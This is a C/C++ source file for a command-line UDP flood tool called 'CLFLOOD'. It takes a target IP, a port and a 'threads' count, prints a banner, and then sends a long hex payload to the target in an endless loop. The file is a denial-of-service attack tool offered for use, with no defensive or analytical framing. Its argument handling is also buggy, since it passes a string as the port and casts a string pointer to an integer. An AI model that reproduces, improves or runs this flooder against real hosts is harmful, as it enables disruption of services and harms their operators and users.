#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <strings.h>
#include <string.h>
#include <ctime>
#include <stdlib.h>
char** clfarg;
int log(char* text, int type){
  if (type == 0){
    printf("[-] %s\n", text);
  }
  if (type == 1){
    printf("[+] %s\n", text);
  }
  if (type == 2){
    printf("[!] %s\n", text);
  }
  if (type == 3){
    printf("[#] %s\n", text);
  }
  return 0;
}



int printlogo(){
  puts("░█████╗░██╗░░░░░███████╗██╗░░░░░░█████╗░░█████╗░██████╗░");
  puts("██╔══██╗██║░░░░░██╔════╝██║░░░░░██╔══██╗██╔══██╗██╔══██╗");
  puts("██║░░╚═╝██║░░░░░█████╗░░██║░░░░░██║░░██║██║░░██║██║░░██║");
  puts("██║░░██╗██║░░░░░██╔══╝░░██║░░░░░██║░░██║██║░░██║██║░░██║");
  puts("╚█████╔╝███████╗██║░░░░░███████╗╚█████╔╝╚█████╔╝██████╔╝");
  puts("░╚════╝░╚══════╝╚═╝░░░░░╚══════╝░╚════╝░░╚════╝░╚═════╝░");
  return 0;
}


bool udpSend(const char *msg, int port){
    sockaddr_in servaddr;
    int fd = socket(AF_INET,SOCK_DGRAM,0);
    if(fd<0){
        log("Socket failed", 2);
        return false;
    }

    bzero(&servaddr,sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(clfarg[1]);
    servaddr.sin_port = htons(port);
    if (sendto(fd, msg, strlen(msg)+1, 0,
               (sockaddr*)&servaddr, sizeof(servaddr)) < 0){
        log("Failed to send UDP packet!", 2);
        close(fd);
        return false;
    }
    close(fd);
    return true;
}

int flood(int portfl){
  while (1){
    for (int count = 0; count < (int)clfarg[3] * 2; ++count){
      udpSend("70f36cf31e2a2727f61b01bb6ffd91a77db12966d618d46a12a062b3e7387277c3f26c6773d2e30252c9544f51bc9fe02a8409d1581c5f89dc55d3f788917eb5266265f47281ffaa6e968c0c0ae55aab230a0e5cfdba572ee17c5c6768ad1d99399d567747899f8f5b319040998d143374bae62f8eb049000ff5740c36b14957283dc3f3a201ed4e1656d32132558d8f870382a554f0e8b3578b58d7d1e4b5acf5b4da675bf472cdcbb9015a37de371dc8baffae037a264d60c1c7cdac9cb8fc29b165af7ce6359c37cbfbf422e391dfdf0f27b07e11d5592741c9df6c902e865ca1d37fe08f6aa4ee756286434a33570f36cf31e2a2727f61b01bb6ffd91a77db12966d618d46a12a062b3e7387277c3f26c6773d2e30252c9544f51bc9fe02a8409d1581c5f89dc55d3f788917eb5266265f47281ffaa6e968c0c0ae55aab230a0e5cfdba572ee17c5c6768ad1d99399d567747899f8f5b319040998d143374bae62f8eb049000ff5740c36b14957283dc3f3a201ed4e1656d32132558d8f870382a554f0e8b3578b58d7d1e4b5acf5b4da675bf472cdcbb9015a37de371dc8baffae037a264d60c1c7cdac9cb8fc29b165af7ce6359c37cbfbf422e391dfdf0f27b07e11d5592741c9df6c902e865ca1d37fe08f6aa4ee756286434a33570f36cf31e2a2727f61b01bb6ffd91a77db12966d618d46a12a062b3e7387277c3f26c6773d2e30252c9544f51bc9fe02a8409d1581c5f89dc55d3f788917eb5266265f47281ffaa6e968c0c0ae55aab230a0e5cfdba572ee17c5c6768ad1d99399d567747899f8f5b319040998d143374bae62f8eb049000ff5740c36b14957283dc3f3a201ed4e1656d32132558d8f870382a554f0e8b3578b58d7d1e4b5acf5b4da675bf472cdcbb9015a37de371dc8baffae037a264d60c1c7cdac9cb8fc29b165af7ce6359c37cbfbf422e391dfdf0f27b07e11d5592741c9df6c902e865ca1d37fe08f6aa4ee756286434a33570f36cf31e2a2727f61b01bb6ffd91a77db12966d618d46a12a062b3e7387277c3f26c6773d2e30252c9544f51bc9fe02a8409d1581c5f89dc55d3f788917eb5266265f47281ffaa6e968c0c0ae55aab230a0e5cfdba572ee17c5c6768ad1d99399d567747899f8f5b319040998d143374bae62f8eb049000ff5740c36b14957283dc3f3a201ed4e1656d32132558d8f870382a554f0e8b3578b58d7d1e4b5acf5b4da675bf472cdcbb9015a37de371dc8baffae037a264d60c1c7cdac9cb8fc29b165af7ce6359c37cbfbf422e391dfdf0f27b07e11d5592741c9df6c902e865ca1d37fe08f6aa4ee756286434a33570f36cf31e2a2727f61b01bb6ffd91a77db12966d618d46a12a062b3e7387277c3f26c6773d2e30252c9544f51bc9fe02a8409d1581c5f89dc55d3f788917eb5266265f47281ffaa6e968c0c0ae55aab230a0e5cfdba572ee17c5c6768ad1d99399d567747899f8f5b319040998d143374bae62f8eb049000ff5740c36b14957283dc3f3a201ed4e1656d32132558d8f870382a554f0e8b3578b58d7d1e4b5acf5b4da675bf472cdcbb9015a37de371dc8baffae037a264d60c1c7cdac9cb8fc29b165af7ce6359c37cbfbf422e391dfdf0f27b07e11d5592741c9df6c902e865ca1d37fe08f6aa4ee756286434a33570f36cf31e2a2727f61b01bb6ffd91a77db12966d618d46a12a062b3e7387277c3f26c6773d2e30252c9544f51bc9fe02a8409d1581c5f89dc55d3f788917eb5266265f47281ffaa6e968c0c0ae55aab230a0e5cfdba572ee17c5c6768ad1d99399d567747899f8f5b319040998d143374bae62f8eb049000ff5740c36b14957283dc3f3a201ed4e1656d32132558d8f870382a554f0e8b3578b58d7d1e4b5acf5b4da675bf472cdcbb9015a37de371dc8baffae037a264d60c1c7cdac9cb8fc29b165af7ce6359c37cbfbf422e391dfdf0f27b07e11d5592741c9df6c902e865ca1d37fe08f6aa4ee756286434a33570f36cf31e2a2727f61b01bb6ffd91a77db12966d618d46a12a062b3e7387277c3f26c6773d2e30252c9544f51bc9fe02a8409d1581c5f89dc55d3f788917eb5266265f47281ffaa6e968c0c0ae55aab230a0e5cfdba572ee17c5c6768ad1d99399d567747899f8f5b319040998d143374bae62f8eb049000ff5740c36b14957283dc3f3a201ed4e1656d32132558d8f870382a554f0e8b3578b58d7d1e4b5acf5b4da675bf472cdcbb9015a37de371dc8baffae037a264d60c1c7cdac9cb8fc29b165af7ce6359c37cbfbf422e391dfdf0f27b07e11d5592741c9df6c902e865ca1d37fe08f6aa4ee756286434a33570f36cf31e2a2727f61b01bb6ffd91a77db12966d618d46a12a062b3e7387277c3f26c6773d2e30252c9544f51bc9fe02a8409d1581c5f89dc55d3f788917eb5266265f47281f3", portfl);
    }
  }
  return 0;
}



int main(int argc, char* argv[]){
  printlogo();
      printf("[+] Starting...\n");
  if (argc < 3){
    printf("[-] Invalid parameters!\n");
    printf("[-] Usage: <IP> <PORT> <THREADS>\n");
    exit(-1);
  }
  else{
    clfarg = argv;
    sleep(2);
      printf("[+] CFG:\n");
      printf(" — Target IP: %s\n", argv[1]);
      printf(" — Target Port: %s\n", argv[2]);
      printf(" — Threads: %s\n", argv[3]);
      printf("[+] Flooding ...\n");
      flood(argv[2]);
  }
    return 0;
}
